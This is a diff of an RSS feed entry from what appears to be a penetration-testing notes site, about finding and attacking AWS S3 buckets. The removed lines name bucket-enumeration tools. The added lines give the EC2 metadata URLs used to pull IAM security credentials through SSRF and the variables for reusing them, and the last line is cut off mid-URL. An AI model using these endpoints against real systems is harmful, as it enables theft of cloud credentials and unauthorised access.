@@ -27,8 +27,8 @@ Gitrob # Gitrob is a github scanner and crawler # Can be used to retrieve sensit
       
       <guid>/open-source-intelligence-osint/hosting-and-repositories/amazon_digitalocean/</guid>
       <description>Look for static content in HTML, you can find content hosted on s3 bucket for example and then exploit it  
-Amazon S3 (AWS) Buckets # Tools like AWSBucketDump can enumerate AWS S3 buckets https://github.com/jordanpotti/AWSBucketDump 
-Teh S3 Bucketeers https://github.com/tomdev/teh_s3_bucketeers/ # You need an AWS account and set your API key in ~/.aws/credentials [default] aws_access_key_id = &amp;lt;key&amp;gt; aws_secret_access_key = &amp;lt;secret&amp;gt; # Then just run it ./bucketeer.sh &amp;lt;target&amp;gt; &amp;lt;target&amp;gt;</description>
+AWS Bucket access (SSRF for example) # You can get informations and secret about an S3 bucket # Credentials, main goal http://169.254.169.254/latest/meta-data/iam/security-credentials/ http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2toS3/ # You might need the zone http://169.254.169.254/latest/dynamic/instance-identity/document # Then set # AWS_ACCESS_KEY_ID # AWS_SECRET_ACCESS_KEY # AWS_DEFAULT_REGION # AWS_SESSION_TOKEN 
+Amazon S3 (AWS) Buckets # Tools like AWSBucketDump can enumerate AWS S3 buckets https://github.</description>
     </item>
     
   </channel>
